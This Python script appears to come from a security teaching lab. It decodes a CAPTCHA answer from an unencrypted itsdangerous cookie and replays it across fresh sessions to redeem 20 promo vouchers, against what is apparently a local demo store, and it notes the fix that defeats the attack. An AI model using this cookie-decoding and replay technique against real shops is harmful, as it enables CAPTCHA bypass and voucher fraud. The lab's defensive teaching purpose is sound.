"""
Chapter 6 — Round 2 Attack: read the answer, then replay it (Section 6.3)

Objective: turn ONE CAPTCHA into 20 vouchers without solving anything.

  1. Fetch a challenge. Look at the `captcha` cookie: itsdangerous payloads
     are base64 JSON with a signature on the end. Signed, not encrypted.
  2. Redeem with the answer read from the cookie.
  3. Replay the same cookie + challenge id + answer from 19 fresh sessions.

Expected results:
  - DEFENSE_LEVEL=1                  → 20/20 (no CAPTCHA on /promo yet)
  - DEFENSE_LEVEL=2, shipped store   → 20/20 vouchers from one challenge
  - DEFENSE_LEVEL=2, fixed store     → 0/20: no answer in the cookie, and
                                       the bot has no solver (yet: Round 3)

Run:
    python attacks/round2_cookie_replay.py
"""

import base64
import json
import zlib

from common import bot, new_challenge, redeem, require_local, summary, unlock

ATTEMPTS = 20


def read_cookie(value):
    """Decode an itsdangerous payload without knowing the key."""
    if not value:
        return None
    payload = value.split(".")[1] if value.startswith(".") else value.split(".")[0]
    raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    if value.startswith("."):          # leading dot = zlib-compressed
        raw = zlib.decompress(raw)
    return json.loads(raw)


def run():
    """Run the attack; return a summary dict (used by tools/checkpoint.py)."""
    require_local()
    first = bot()
    unlock(first)
    cid, _ = new_challenge(first)
    cookie = first.cookies.get("captcha")
    jar_entry = next((ck for ck in first.cookies.jar if ck.name == "captcha"), None)
    leaked = read_cookie(cookie)
    answer = (leaked or {}).get("answer", "")

    vouchers, reasons = 0, {}
    for i in range(ATTEMPTS):
        c = first if i == 0 else bot()
        if i:
            unlock(c)
            if jar_entry:
                c.cookies.jar.set_cookie(jar_entry)      # the same solved cookie
        status, body = redeem(c, cid or "", answer)
        vouchers += status == 200
        if status != 200:
            reasons[body.get("error")] = reasons.get(body.get("error"), 0) + 1
    return summary("round2_cookie_replay", ATTEMPTS, vouchers, leaked=leaked,
                   challenge=cid, reasons=reasons)


if __name__ == "__main__":
    s = run()
    print("=== Round 2: read the answer from the cookie, then replay ===")
    if s["challenge"] is None:
        print("  no CAPTCHA on /promo at this level")
    elif s["leaked"]:
        print(f"  cookie payload (no key needed): {s['leaked']}")
    else:
        print("  no answer in any cookie: we'd need a solver (Round 3)")
    print(f"  vouchers: {s['successes']}/{s['attempts']} from one challenge")
    for reason, n in s["reasons"].items():
        print(f"  rejected ×{n}: {reason}")
